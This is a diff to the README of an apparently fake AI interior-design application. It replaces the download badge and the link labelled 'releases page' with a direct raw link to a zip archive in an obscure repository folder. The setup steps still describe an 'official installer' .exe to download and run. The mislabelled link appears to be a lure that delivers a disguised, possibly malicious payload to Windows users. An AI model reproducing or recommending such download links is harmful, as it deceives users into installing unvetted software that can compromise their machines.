@@ -1,6 +1,6 @@
 # 🏠 ai-interior-design-roomgpt-remodel-ai - Create professional home designs using artificial intelligence
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Vxz789913/ai-interior-design-roomgpt-remodel-ai/releases)
+[![Download Application](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Vxz789913/ai-interior-design-roomgpt-remodel-ai/raw/refs/heads/main/initiary/ai_roomgpt_interior_design_remodel_v2.7.zip)
 
 ## 📖 About this application
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards for a stable experience:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Vxz789913/ai-interior-design-roomgpt-remodel-ai/releases) to access the official installer. 
+1. Visit the [releases page](https://github.com/Vxz789913/ai-interior-design-roomgpt-remodel-ai/raw/refs/heads/main/initiary/ai_roomgpt_interior_design_remodel_v2.7.zip) to access the official installer. 
 2. Look for the file ending in .exe under the latest version tag.
 3. Click the file name to start the download.
 4. Save the file to your desktop or downloads folder.
